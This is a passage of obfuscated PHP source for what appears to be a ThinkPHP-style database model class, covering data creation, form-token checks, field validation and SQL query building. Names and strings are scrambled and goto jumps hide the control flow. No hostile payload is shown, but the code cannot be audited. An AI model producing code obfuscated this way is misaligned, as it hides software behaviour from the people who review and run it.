1; goto bòÙ‚ïŸÅ”; f­¨¸¾Íæ: } protected function _afterFind(&$Dòš¥ØØ«“, $BÛ¶ˆÜ¥) { } protected function returnResult($cø·±ğÈ†ˆ, $C¡ô‘…ìó = '') { $CšÔ ÇÕç´ =& $_SERVER[Å¸ş]; if ($C¡ô‘…ìó) { if (is_callable($C¡ô‘…ìó)) { return call_user_func($C¡ô‘…ìó, $cø·±ğÈ†ˆ); } switch (strtolower($C¡ô‘…ìó)) { case $CšÔ ÇÕç´[282]: return json_encode($cø·±ğÈ†ˆ); case $CšÔ ÇÕç´[283]: return xml_encode($cø·±ğÈ†ˆ); } } return $cø·±ğÈ†ˆ; } public function parseFieldsMap($bÓ©ÇÉçÃÂ, $BÍï‘ÌÀ¸ï = 1) { if (!empty($this->_map)) { foreach ($this->_map as $DöÅè‹ä– => $D‘‚’ª‘Ú÷) { if ($BÍï‘ÌÀ¸ï == 1) { if (isset($bÓ©ÇÉçÃÂ[$D‘‚’ª‘Ú÷])) { $bÓ©ÇÉçÃÂ[$DöÅè‹ä–] = $bÓ©ÇÉçÃÂ[$D‘‚’ª‘Ú÷]; unset($bÓ©ÇÉçÃÂ[$D‘‚’ª‘Ú÷]); } } else { if (isset($bÓ©ÇÉçÃÂ[$DöÅè‹ä–])) { $bÓ©ÇÉçÃÂ[$D‘‚’ª‘Ú÷] = $bÓ©ÇÉçÃÂ[$DöÅè‹ä–]; unset($bÓ©ÇÉçÃÂ[$DöÅè‹ä–]); } } } } return $bÓ©ÇÉçÃÂ; } public function setField($AÙ¬õìÕ†—, $Aø¤¡‰ = '') { if (is_array($AÙ¬õìÕ†—)) { $e¤‚Éåæ¢¿ = $AÙ¬õìÕ†—; } else { $e¤‚Éåæ¢¿[$AÙ¬õìÕ†—] = $Aø¤¡‰; } return $this->save($e¤‚Éåæ¢¿); } public function setAdd($a´ËÅ¢Ä”Œ, $aÕª©ê¿ÃÃ = 1) { $D¢êÎ†åÂ¿ =& $_SERVER[Å¸ş]; $c­Š®ÔØ‘ = $a´ËÅ¢Ä”Œ . $D¢êÎ†åÂ¿[284] . $aÕª©ê¿ÃÃ; if ($aÕª©ê¿ÃÃ < 0) { $c­Š®ÔØ‘ = $a´ËÅ¢Ä”Œ . $aÕª©ê¿ÃÃ; } return $this->setField($a´ËÅ¢Ä”Œ, array($D¢êÎ†åÂ¿[285], $c­Š®ÔØ‘)); } public function getField($F‚À®˜„‡Œ, $a°Éã¼Æ˜ = null) { $CÚË¢¾ÉÛá =& $_SERVER[Å¸ş]; $B¦É¶œ[$CÚË¢¾ÉÛá[261]] = $F‚À®˜„‡Œ; $B¦É¶œ = $this->_parseOptions($B¦É¶œ); $F‚À®˜„‡Œ = trim($F‚À®˜„‡Œ); if (strpos($F‚À®˜„‡Œ, $CÚË¢¾ÉÛá[47])) { if (!isset($B¦É¶œ[$CÚË¢¾ÉÛá[280]])) { $B¦É¶œ[$CÚË¢¾ÉÛá[280]] = is_numeric($a°Éã¼Æ˜) ? $a°Éã¼Æ˜ : $CÚË¢¾ÉÛá[33]; } $díåõ²øâÖ = $this->db->select($B¦É¶œ); if (!empty($díåõ²øâÖ)) { goto fê‡Éó£ñ¤; fê‡Éó£ñ¤: $e²ø±ùÒ’Ä = explode($CÚË¢¾ÉÛá[47], $F‚À®˜„‡Œ); $F‚À®˜„‡Œ = array_keys($díåõ²øâÖ[0]); $A¯À”™ÅÎí = array_shift($F‚À®˜„‡Œ); goto e¨’×–Œà; e¨’×–Œà: $aÇŒäõñî = array_shift($F‚À®˜„‡Œ); $CÑµÀÄÍ÷ = array(); $eß„›¤æ— = count($e²ø±ùÒ’Ä); goto D·ŒĞÂ ¾÷; D·ŒĞÂ ¾÷: foreach ($díåõ²øâÖ as $Aòâï£…ğ) { $f†¾Ğ¼Â¹„ = $Aòâï£…ğ[$A¯À”™ÅÎí]; if (2 == $eß„›¤æ—) { $CÑµÀÄÍ÷[$f†¾Ğ¼Â¹„] = $Aòâï£…ğ[$aÇŒäõñî]; } else { $CÑµÀÄÍ÷[$f†¾Ğ¼Â¹„] = is_string($a°Éã¼Æ˜) ? implode($a°Éã¼Æ˜, $Aòâï£…ğ) : $Aòâï£…ğ; } } return $CÑµÀÄÍ÷; goto F÷çŞ©ˆ«; F÷çŞ©ˆ«: } } else { if (!0 !== $a°Éã¼Æ˜) { $B¦É¶œ[$CÚË¢¾ÉÛá[280]] = is_numeric($a°Éã¼Æ˜) ? $a°Éã¼Æ˜ : 1; } if ($a°Éã¼Æ˜ === $CÚË¢¾ÉÛá[243]) { unset($B¦É¶œ[$CÚË¢¾ÉÛá[280]]); } $Aòâï£…ğ = $this->db->select($B¦É¶œ); if (!empty($Aòâï£…ğ)) { if ($a°Éã¼Æ˜ === $CÚË¢¾ÉÛá[243]) { return reset($Aòâï£…ğ[0]); } if (!0 !== $a°Éã¼Æ˜ && 1 == $B¦É¶œ[$CÚË¢¾ÉÛá[280]]) { return reset($Aòâï£…ğ[0]); } foreach ($Aòâï£…ğ as $cµãŸ×Â“) { $B×Â¶±ÅŸ†[] = $cµãŸ×Â“[$F‚À®˜„‡Œ]; } return $B×Â¶±ÅŸ†; } } return null; } public function create($a‘ìÆ÷¼Ô‹ = '', $CÛ˜ó…ñŒ© = '') { goto cÚ¹è‘«÷Ş; cÚ¹è‘«÷Ş: $c¨ƒÑ²Ù±Š =& $_SERVER[Å¸ş]; if (empty($a‘ìÆ÷¼Ô‹)) { $a‘ìÆ÷¼Ô‹ = $_POST; } elseif (is_object($a‘ìÆ÷¼Ô‹)) { $a‘ìÆ÷¼Ô‹ = get_object_vars($a‘ìÆ÷¼Ô‹); } if (empty($a‘ìÆ÷¼Ô‹) || !is_array($a‘ìÆ÷¼Ô‹)) { $this->error = think_lang($c¨ƒÑ²Ù±Š[259]); return !1; } goto d‰­åßº§ì; d‰­åßº§ì: $a‘ìÆ÷¼Ô‹ = $this->parseFieldsMap($a‘ìÆ÷¼Ô‹, 0); $CÛ˜ó…ñŒ© = $CÛ˜ó…ñŒ© ? $CÛ˜ó…ñŒ© : (!empty($a‘ìÆ÷¼Ô‹[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$c¨ƒÑ²Ù±Š[261]])) { $F¥‚î°†‹¾ = $this->options[$c¨ƒÑ²Ù±Š[261]]; unset($this->options[$c¨ƒÑ²Ù±Š[261]]); } elseif ($CÛ˜ó…ñŒ© == THINK_MODEL_INSERT && isset($this->insertFields)) { $F¥‚î°†‹¾ = $this->insertFields; } elseif ($CÛ˜ó…ñŒ© == THINK_MODEL_UPDATE && isset($this->updateFields)) { $F¥‚î°†‹¾ = $this->updateFields; } goto FÄ¸ã‘¤×ˆ; bÀğ‹¨µ©Ã: if ($this->autoCheckFields) { $F¥‚î°†‹¾ = $this->getDbFields(); foreach ($a‘ìÆ÷¼Ô‹ as $F¶ÏÉ‘ò¬¯ => $f¸Ò¼ÏÆå®) { if (!in_array($F¶ÏÉ‘ò¬¯, $F¥‚î°†‹¾)) { unset($a‘ìÆ÷¼Ô‹[$F¶ÏÉ‘ò¬¯]); } elseif (MAGIC_QUOTES_GPC && is_string($f¸Ò¼ÏÆå®)) { $a‘ìÆ÷¼Ô‹[$F¶ÏÉ‘ò¬¯] = stripslashes($f¸Ò¼ÏÆå®); } } } $this->autoOperation($a‘ìÆ÷¼Ô‹, $CÛ˜ó…ñŒ©); $this->data = $a‘ìÆ÷¼Ô‹; goto Añ–¬øØ; FÄ¸ã‘¤×ˆ: if (isset($F¥‚î°†‹¾)) { if (is_string($F¥‚î°†‹¾)) { $F¥‚î°†‹¾ = explode($c¨ƒÑ²Ù±Š[47], $F¥‚î°†‹¾); } if (think_config($c¨ƒÑ²Ù±Š[286])) { $F¥‚î°†‹¾[] = think_config($c¨ƒÑ²Ù±Š[287]); } foreach ($a‘ìÆ÷¼Ô‹ as $F¶ÏÉ‘ò¬¯ => $f¸Ò¼ÏÆå®) { if (!in_array($F¶ÏÉ‘ò¬¯, $F¥‚î°†‹¾)) { unset($a‘ìÆ÷¼Ô‹[$F¶ÏÉ‘ò¬¯]); } } } if (!$this->autoValidation($a‘ìÆ÷¼Ô‹, $CÛ˜ó…ñŒ©)) { return !1; } if (!$this->autoCheckToken($a‘ìÆ÷¼Ô‹)) { $this->error = think_lang($c¨ƒÑ²Ù±Š[288]); return !1; } goto bÀğ‹¨µ©Ã; Añ–¬øØ: return $a‘ìÆ÷¼Ô‹; goto f»»ÊŸš®; f»»ÊŸš®: } public function autoCheckToken($CãŞÍ–ìæ) { $cœß‹“É¡„ =& $_SERVER[Å¸ş]; if (isset($this->options[$cœß‹“É¡„[289]]) && !$this->options[$cœß‹“É¡„[289]]) { return !0; } if (think_config($cœß‹“É¡„[286])) { $B¬àìÈµî = think_config($cœß‹“É¡„[287]); if (!isset($CãŞÍ–ìæ[$B¬àìÈµî]) || Session::get($B¬àìÈµî)) { return !1; } list($f›É¾Ïäè÷, $dœŞÜç»Ô) = explode($cœß‹“É¡„[70], $CãŞÍ–ìæ[$B¬àìÈµî]); if ($dœŞÜç»Ô && Session::get($B¬àìÈµî . $cœß‹“É¡„[91] . $f›É¾Ïäè÷) === $dœŞÜç»Ô) { Session::remove($B¬àìÈµî . $cœß‹“É¡„[91] . $f›É¾Ïäè÷); return !0; } if (think_config($cœß‹“É¡„[290])) { Session::remove($B¬àìÈµî . $cœß‹“É¡„[91] . $f›É¾Ïäè÷); } return !1; } return !0; } public function regex($a‰Ç‰³Š‘‹, $f…å¡ŠÍ‹) { $C…æº›Å =& $_SERVER[Å¸ş]; $bê¤¦·¯¢Î = array($C…æº›Å[291] => $C…æº›Å[292], $C…æº›Å[293] => $C…æº›Å[294], $C…æº›Å[295] => $C…æº›Å[296], $C…æº›Å[297] => $C…æº›Å[298], $C…æº›Å[299] => $C…æº›Å[300], $C…æº›Å[301] => $C…æº›Å[302], $C…æº›Å[303] => $C…æº›Å[304], $C…æº›Å[278] => $C…æº›Å[305], $C…æº›Å[306] => $C…æº›Å[307]); if (isset($bê¤¦·¯¢Î[strtolower($f…å¡ŠÍ‹)])) { $f…å¡ŠÍ‹ = $bê¤¦·¯¢Î[strtolower($f…å¡ŠÍ‹)]; } return preg_match($f…å¡ŠÍ‹, $a‰Ç‰³Š‘‹) === 1; } private function autoOperation(&$C÷¸š«ŞŸ¤, $EŒ­ë¬Ãµİ) { $c¯é‰êÜÄİ =& $_SERVER[Å¸ş]; if (!empty($this->options[$c¯é‰êÜÄİ[308]])) { $D¡ñ¨Üä‡Í = $this->options[$c¯é‰êÜÄİ[308]]; unset($this->options[$c¯é‰êÜÄİ[308]]); } elseif (!empty($this->_auto)) { $D¡ñ¨Üä‡Í = $this->_auto; } if (isset($D¡ñ¨Üä‡Í)) { foreach ($D¡ñ¨Üä‡Í as $dŞïÉˆÈ…) { if (empty($dŞïÉˆÈ…[2])) { $dŞïÉˆÈ…[2] = THINK_MODEL_INSERT; } if ($EŒ­ë¬Ãµİ == $dŞïÉˆÈ…[2] || $dŞïÉˆÈ…[2] == THINK_MODEL_BOTH) { switch (trim($dŞïÉˆÈ…[3])) { case $c¯é‰êÜÄİ[309]: case $c¯é‰êÜÄİ[310]: $b§ïšæŒàô = isset($dŞïÉˆÈ…[4]) ? (array) $dŞïÉˆÈ…[4] : array(); if (isset($C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]])) { array_unshift($b§ïšæŒàô, $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]]); } if ($c¯é‰êÜÄİ[309] == $dŞïÉˆÈ…[3]) { $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]] = call_user_func_array($dŞïÉˆÈ…[1], $b§ïšæŒàô); } else { $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]] = call_user_func_array(array(&$this, $dŞïÉˆÈ…[1]), $b§ïšæŒàô); } break; case $c¯é‰êÜÄİ[261]: $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]] = $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[1]]; break; case $c¯é‰êÜÄİ[311]: if ($c¯é‰êÜÄİ[33] === $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]]) { unset($C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]]); } break; case $c¯é‰êÜÄİ[312]: default: $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]] = $dŞïÉˆÈ…[1]; } if (!1 === $C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]]) { unset($C÷¸š«ŞŸ¤[$dŞïÉˆÈ…[0]]); } } } } return $C÷¸š«ŞŸ¤; } protected function autoValidation($A½Æˆ˜¸, $dçÒ‹‹£ ¾) { $bƒ‰§šÍØÆ =& $_SERVER[Å¸ş]; if (!empty($this->options[$bƒ‰§šÍØÆ[313]])) { $dâÖ­Ø¸”Ù = $this->options[$bƒ‰§šÍØÆ[313]]; unset($this->options[$bƒ‰§šÍØÆ[313]]); } elseif (!empty($this->_validate)) { $dâÖ­Ø¸”Ù = $this->_validate; } if (isset($dâÖ­Ø¸”Ù)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dâÖ­Ø¸”Ù as $bêé©©¿ => $F½‘¼áƒêÆ) { if (empty($F½‘¼áƒêÆ[5]) || $F½‘¼áƒêÆ[5] == THINK_MODEL_BOTH || $F½‘¼áƒêÆ[5] == $dçÒ‹‹£ ¾) { if (0 == strpos($F½‘¼áƒêÆ[2], $bƒ‰§šÍØÆ[314]) && strpos($F½‘¼áƒêÆ[2], $bƒ‰§šÍØÆ[315])) { $F½‘¼áƒêÆ[2] = think_lang(substr($F½‘¼áƒêÆ[2], 2, -1)); } $F½‘¼áƒêÆ[3] = isset($F½‘¼áƒêÆ[3]) ? $F½‘¼áƒêÆ[3] : THINK_EXISTS_VALIDATE; $F½‘¼áƒêÆ[4] = isset($F½‘¼áƒêÆ[4]) ? $F½‘¼áƒêÆ[4] : $bƒ‰§šÍØÆ[316]; switch ($F½‘¼áƒêÆ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($A½Æˆ˜¸, $F½‘¼áƒêÆ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($bƒ‰§šÍØÆ[33] != trim($A½Æˆ˜¸[$F½‘¼áƒêÆ[0]])) { if (!1 === $this->_validationField($A½Æˆ˜¸, $F½‘¼áƒêÆ)) { return !1; } } break; default: if (isset($A½Æˆ˜¸[$F½‘¼áƒêÆ[0]])) { if (!1 === $this->_validationField($A½Æˆ˜¸, $F½‘¼áƒêÆ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($A—ôĞ•ÈŞ, $cŒè»Ñ™ñœ) { if (!1 === $this->_validationFieldItem($A—ôĞ•ÈŞ, $cŒè»Ñ™ñœ)) { if ($this->patchValidate) { $this->error[$cŒè»Ñ™ñœ[0]] = $cŒè»Ñ™ñœ[2]; } else { $this->error = $cŒè»Ñ™ñœ[2]; return !1; } } return; } protected function _validationFieldItem($CÒÇÓèÖª, $BÎ®¾¾¶½Ÿ) { $aÖ£¥¥‚‰– =& $_SERVER[Å¸ş]; switch (strtolower(trim($BÎ®¾¾¶½Ÿ[4]))) { case $aÖ£¥¥‚‰–[309]: case $aÖ£¥¥‚‰–[310]: $EµÇ›¿§Üã = isset($BÎ®¾¾¶½Ÿ[6]) ? (array) $BÎ®¾¾¶½Ÿ[6] : array(); if (is_string($BÎ®¾¾¶½Ÿ[0]) && strpos($BÎ®¾¾¶½Ÿ[0], $aÖ£¥¥‚‰–[47])) { $BÎ®¾¾¶½Ÿ[0] = explode($aÖ£¥¥‚‰–[47], $BÎ®¾¾¶½Ÿ[0]); } if (is_array($BÎ®¾¾¶½Ÿ[0])) { foreach ($BÎ®¾¾¶½Ÿ[0] as $EĞóó›¨ô‹) { $FÅåÃƒ­½[$EĞóó›¨ô‹] = $CÒÇÓèÖª[$EĞóó›¨ô‹]; } array_unshift($EµÇ›¿§Üã, $FÅåÃƒ­½); } else { array_unshift($EµÇ›¿§Üã, $CÒÇÓèÖª[$BÎ®¾¾¶½Ÿ[0]]); } if ($aÖ£¥¥‚‰–[309] == $BÎ®¾¾¶½Ÿ[4]) { return call_user_func_array($BÎ®¾¾¶½Ÿ[1], $EµÇ›¿§Üã); } else { return call_user_func_array(array(&$this, $BÎ®¾¾¶½Ÿ[1]), $EµÇ›¿§Üã); } case $aÖ£¥¥‚‰–[317]: return $CÒÇÓèÖª[$BÎ®¾¾¶½Ÿ[0]] == $CÒÇÓèÖª[$BÎ®¾¾¶½Ÿ[1]]; case $aÖ£¥¥‚‰–[318]: if (is_string($BÎ®¾¾¶½Ÿ[0]) && strpos($BÎ®¾¾¶½Ÿ[0], $aÖ£¥¥‚‰–[47])) { $BÎ®¾¾¶½Ÿ[0] = explode($aÖ£¥¥‚‰–[47], $BÎ®¾¾¶½Ÿ[0]); } $f«êš±çô¹ = array(); if (is_array($BÎ®¾¾¶½Ÿ[0])) { foreach ($BÎ®¾¾¶½Ÿ[0] as $EĞóó›¨ô‹) { $f«êš±çô¹[$EĞóó›¨ô‹] = $CÒÇÓèÖª[$EĞóó›¨ô‹]; } } else { $f«êš±çô¹[$BÎ®¾¾¶½Ÿ[0]] = $CÒÇÓèÖª[$BÎ®¾¾¶½Ÿ[0]]; } if (!empty($CÒÇÓèÖª[$this->getPk()])) { $f«êš±çô¹[$this->getPk()] = array($aÖ£¥¥‚‰–[319], $CÒÇÓèÖª[$this->getPk()]); } if ($this->where($f«êš±çô¹)->find()) { return !1; } return !0; default: return $this->check($CÒÇÓèÖª[$BÎ®¾¾¶½Ÿ[0]], $BÎ®¾¾¶½Ÿ[1], $BÎ®¾¾¶½Ÿ[4]); } } public function check($A¬•ôà, $a†¢ªÒ›Œã, $cÙÓÊîŒ¾Í = "\x72\x65\x67\x65\170") { $e‡°„ŒæôÍ =& $_SERVER[Å¸ş]; $cÙÓÊîŒ¾Í = strtolower(trim($cÙÓÊîŒ¾Í)); switch ($cÙÓÊîŒ¾Í) { case $e‡°„ŒæôÍ[7]: case $e‡°„ŒæôÍ[320]: $aÌ×¨Ä¬ = is_array($a†¢ªÒ›Œã) ? $a†¢ªÒ›Œã : explode($e‡°„ŒæôÍ[47], $a†¢ªÒ›Œã); return $cÙÓÊîŒ¾Í == $e‡°„ŒæôÍ[7] ? in_array($A¬•ôà, $aÌ×¨Ä¬) : !in_array($A¬•ôà, $aÌ×¨Ä¬); case $e‡°„ŒæôÍ[321]: case $e‡°„ŒæôÍ[322]: if (is_array($a†¢ªÒ›Œã)) { $cÉ¶ª÷†ÛÎ = $a†¢ªÒ›Œã[0]; $BÎ¤¸ÁÏàº = $a†¢ªÒ›Œã[1]; } else { list($cÉ¶ª÷†ÛÎ, $BÎ¤¸ÁÏàº) = explode($e‡°„ŒæôÍ[47], $a†¢ªÒ›Œã); } return $cÙÓÊîŒ¾Í == $e‡°„ŒæôÍ[321] ? $A¬•ôà >= $cÉ¶ª÷†ÛÎ && $A¬•ôà <= $BÎ¤¸ÁÏàº : $A¬•ôà < $cÉ¶ª÷†ÛÎ || $A¬•ôà > $BÎ¤¸ÁÏàº; case $e‡°„ŒæôÍ[323]: case $e‡°„ŒæôÍ[324]: return $cÙÓÊîŒ¾Í == $e‡°„ŒæôÍ[323] ? $A¬•ôà == $a†¢ªÒ›Œã : $A¬•ôà != $a†¢ªÒ›Œã; case $e‡°„ŒæôÍ[325]: $EË»ŸÔ©Ù = mb_strlen($A¬•ôà, $e‡°„ŒæôÍ[326]); if (strpos($a†¢ªÒ›Œã, $e‡°„ŒæôÍ[47])) { list($cÉ¶ª÷†ÛÎ, $BÎ¤¸ÁÏàº) = explode($e‡°„ŒæôÍ[47], $a†¢ªÒ›Œã); return $EË»ŸÔ©Ù >= $cÉ¶ª÷†ÛÎ && $EË»ŸÔ©Ù <= $BÎ¤¸ÁÏàº; } else { return $EË»ŸÔ©Ù == $a†¢ªÒ›Œã; } case $e‡°„ŒæôÍ[327]: list($e„íÁŞŞ°Ğ, $D¿¾šÈªŠ›) = explode($e‡°„ŒæôÍ[47], $a†¢ªÒ›Œã); if (!is_numeric($e„íÁŞŞ°Ğ)) { $e„íÁŞŞ°Ğ = strtotime($e„íÁŞŞ°Ğ); } if (!is_numeric($D¿¾šÈªŠ›)) { $D¿¾šÈªŠ› = strtotime($D¿¾šÈªŠ›); } return NOW_TIME >= $e„íÁŞŞ°Ğ && NOW_TIME <= $D¿¾šÈªŠ›; case $e‡°„ŒæôÍ[328]: return in_array(get_client_ip(), explode($e‡°„ŒæôÍ[47], $a†¢ªÒ›Œã)); case $e‡°„ŒæôÍ[329]: return !in_array(get_client_ip(), explode($e‡°„ŒæôÍ[47], $a†¢ªÒ›Œã)); case $e‡°„ŒæôÍ[316]: default: return $this->regex($A¬•ôà, $a†¢ªÒ›Œã); } } public function query($c¢òÔè†óà, $B¤¸¿ËĞ¸ = false) { $E½ÇÔë´Ï =& $_SERVER[Å¸ş]; if (!is_bool($B¤¸¿ËĞ¸) && !is_array($B¤¸¿ËĞ¸)) { $B¤¸¿ËĞ¸ = func_get_args(); array_shift($B¤¸¿ËĞ¸); } $c¢òÔè†óà = str_replace(array($E½ÇÔë´Ï[217], $E½ÇÔë´Ï[330]), $E½ÇÔë´Ï[50], $c¢òÔè†óà); $c¢òÔè†óà = $this->parseSql($c¢òÔè†óà, $B¤¸¿ËĞ¸); return $this->db->query($c¢òÔè†óà); } public function execute($dŸ§ ¾‡Æ, $fà¦±· = false) { if (!is_bool($fà¦±·) && !is_array($fà¦±·)) { $fà¦±· = func_get_args(); array_shift($fà¦±·); } $dŸ§ ¾‡Æ = $this->parseSql($dŸ§ ¾‡Æ, $fà¦±·); return $this->db->execute($dŸ§ ¾‡Æ); } protected function parseSql($B†ÍãØªâÆ, $cªâ´ ¥õ™) { $a´Í¥Õ÷¢ô =& $_SERVER[Å¸ş]; if (!0 === $cªâ´ ¥õ™) { $dØÏëâ‰ƒ‹ = $this->_parseOptions(); $B†ÍãØªâÆ = $this->db->parseSql($B†ÍãØªâÆ, $dØÏëâ‰ƒ‹); } elseif (is_array($cªâ´ ¥õ™)) { $cªâ´ ¥õ™ = array_map(array($this->db, $a´Í¥Õ÷¢ô[331]), $cªâ´ ¥õ™); $B†ÍãØªâÆ = vsprintf($B†ÍãØªâÆ, $cªâ´ ¥õ™); } else { $B†ÍãØªâÆ = strtr($B†ÍãØªâÆ, array($a´Í¥Õ÷¢ô[332] => $this->getTableName(), $a´Í¥Õ÷¢ô[333] => think_config($a´Í¥Õ÷¢ô[232]))); } $this->db->setModel($this->name); return $B†ÍãØªâÆ; } public function db($BâèÕ„¦· = '', $a†ğŒ—ÎæÒ = '', $aĞ¯Œ°¥¼ = array()) { goto eÁã¹à‰Š‘; eÁã¹à‰Š‘: $A´ƒÁŠºº =& $_SERVER[Å¸ş]; if ($A´ƒÁŠºº[33] === $BâèÕ„¦· && $this->db) { return $this->db; } static $C¤‹àÜœâ = array(); goto d‹Ş…İ¨¸; d‹Ş…İ¨¸: static $AøÇ­¤ÎöŒ = array(); if (!isset($AøÇ­¤ÎöŒ[$BâèÕ„¦·]) || isset($AøÇ­¤ÎöŒ[$BâèÕ„¦·]) && $a†ğŒ—ÎæÒ && $C¤‹àÜœâ[$BâèÕ„¦·] != $a†ğŒ—ÎæÒ) { if (!empty($a†ğŒ—ÎæÒ) && is_string($a†ğŒ—ÎæÒ) && !1 === strpos($a†ğŒ—ÎæÒ, $A´ƒÁŠºº[8])) { $a†ğŒ—ÎæÒ = think_config($a†ğŒ—ÎæÒ); } $AøÇ­¤ÎöŒ[$BâèÕ„¦·] = Db::getInstance($a†ğŒ—ÎæÒ); } elseif (NULL === $a†ğŒ—ÎæÒ) { $AøÇ­¤ÎöŒ[$BâèÕ„¦·]->close(); unset($AøÇ­¤ÎöŒ[$BâèÕ„¦·]); return; } if (!empty($aĞ¯Œ°¥¼)) { if (is_string($aĞ¯Œ°¥¼)) { parse_str($aĞ¯Œ°¥¼, $aĞ¯Œ°¥¼); } foreach ($aĞ¯Œ°¥¼ as $f¬ëÅ¤Áìà => $A‡Åáä­æ½) { $this->setProperty($f¬ëÅ¤Áìà, $A‡Åáä­æ½); } } goto D‘ŒçíË¯; D‘ŒçíË¯: $C¤‹àÜœâ[$BâèÕ„¦·] = $a†ğŒ—ÎæÒ; $this->db = $AøÇ­¤ÎöŒ[$BâèÕ„¦·]; $this->_after_db(); goto AÊ»§Şº”®; AÊ»§Şº”®: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto Eâ¹íÇ½ƒ; Eâ¹íÇ½ƒ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $FÉàÙ¦¥­ = get_class($this); if ($FÉàÙ¦¥­ == $_SERVER[Å¸ş][334]) { return $this->name; } $this->name = substr($FÉàÙ¦¥­, 0, -5); } return $this->name; } public function getTableName() { $c«Í‡îº£¸ =& $_SERVER[Å¸ş]; if (empty($this->trueTableName)) { $cæŸ…¨‹÷ = !empty($this->tablePrefix) ? $this->tablePrefix : $c«Í‡îº£¸[33]; if (!empty($this->tableName)) { $cæŸ…¨‹÷ .= $this->tableName; } else { $cæŸ…¨‹÷ .= think_parse_name($this->name); } $this->trueTableName = strtolower($cæŸ…¨‹÷); } return (!empty($this->dbName) ? $this->dbName . $c«Í‡îº£¸[91] : $c«Í‡îº£¸[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $BÔ·Ô½Üñ‘ =& $_SERVER[Å¸ş]; return isset($this->fields[$BÔ·Ô½Üñ‘[239]]) ? $this->fields[$BÔ·Ô½Üñ‘[239]] : $this->pk; } public function getDbFields() { $D¸©ÎÆ¨ğŒ =& $_SERVER[Å¸ş]; if (isset($this->options[$D¸©ÎÆ¨ğŒ[267]])) { $EÖ”Ãê¸ÔÎ = $this->db->getFields($this->options[$D¸©ÎÆ¨ğŒ[267]]); return $EÖ”Ãê¸ÔÎ ? array_keys($EÖ”Ãê¸ÔÎ) : !1; } if ($this->fields) { $EÖ”Ãê¸ÔÎ = $this->fields; unset($EÖ”Ãê¸ÔÎ[$D¸©ÎÆ¨ğŒ[238]], $EÖ”Ãê¸ÔÎ[$D¸©ÎÆ¨ğŒ[239]], $EÖ”Ãê¸ÔÎ[$D¸©ÎÆ¨ğŒ[240]], $EÖ”Ãê¸ÔÎ[$D¸©ÎÆ¨ğŒ[237]]); return $EÖ”Ãê¸ÔÎ; } return !1; } public function data($dï¯Ç¢Ôìß = '') { $aŞŠÂìÂ“£ =& $_SERVER[Å¸ş]; if ($aŞŠÂìÂ“£[33] === $dï¯Ç¢Ôìß && !empty($this->data)) { return $this->data; } if (is_object($dï¯Ç¢Ôìß)) { $dï¯Ç¢Ôìß = get_object_vars($dï¯Ç¢Ôìß); } elseif (is_string($dï¯Ç¢Ôìß)) { parse_str($dï¯Ç¢Ôìß, $dï¯Ç¢Ôìß); } elseif (!is_array($dï¯Ç¢Ôìß)) { think_exception(think_lang($aŞŠÂìÂ“£[259])); } $this->data = $dï¯Ç¢Ôìß; return $this; } public function join($a£„Ôï©˜É) { $AÑ×Í„Óˆ =& $_SERVER[Å¸ş]; if (is_array($a£„Ôï©˜É)) { $this->options[$AÑ×Í„Óˆ[270]] = $a£„Ôï©˜É; } elseif (!empty($a£„Ôï©˜É)) { $this->options[$AÑ×Í„Óˆ[270]][] = $a£„Ôï©˜É; } return $this; } public function union($A’“¢—ìä®, $cğˆĞ£¢Íæ = false) { goto aÍ£îÚÛÇŠ; aÍ£îÚÛÇŠ: $CäƒÅ’‡ãÓ =& $_SERVER[Å¸ş]; if (empty($A’“¢—ìä®)) { return $this; } if ($cğˆĞ£¢Íæ) { $this->options[$CäƒÅ’‡ãÓ[335]][$CäƒÅ’‡ãÓ[336]] = !0; } goto bÄŞ˜¹©ß; Eˆ›¶É¤Ú: return $this; goto Aó«ŒĞŠÀô; bÄŞ˜¹©ß: if (is_object($A’“¢—ìä®)) { $A’“¢—ìä® = get_object_vars($A’“¢—ìä®); } if (is_string($A’“¢—ìä®)) { $eºñ³ä¡ˆ‰ = $A’“¢—ìä®; } elseif (is_array($A’“¢—ìä®)) { if (isset($A’“¢—ìä®[0])) { $this->options[$CäƒÅ’‡ãÓ[335]] = array_merge($this->options[$CäƒÅ’‡ãÓ[335]], $A’“¢—ìä®); return $this; } else { $eºñ³ä¡ˆ‰ = $A’“¢—ìä®; } } else { think_exception(think_lang($CäƒÅ’‡ãÓ[259])); } $this->options[$CäƒÅ’‡ãÓ[335]][] = $eºñ³ä¡ˆ‰; goto Eˆ›¶É¤Ú; Aó«ŒĞŠÀô: } public function cache($f‡Ÿù«Œ‹ = true, $cÜø‹Ü¡—¾ = null, $a†Ëå¸ëÍÑ = '') { $fÑíó¢‡ô =& $_SERVER[Å¸ş]; if (!1 !== $f‡Ÿù«Œ‹) { $this->options[$fÑíó¢‡ô[337]] = array($fÑíó¢‡ô[89] => $f‡Ÿù«Œ‹, $fÑíó¢‡ô[327] => $cÜø‹Ü¡—¾, $fÑíó¢‡ô[29] => $a†Ëå¸ëÍÑ); } return $this; } public function field($bñ´˜–…ŠÓ, $e»îê±çˆÌ = false) { $D °Ò„½“Û =& $_SERVER[Å¸ş]; if (!0 === $bñ´˜–…ŠÓ) { $cˆæê±âš = $this->getDbFields(); 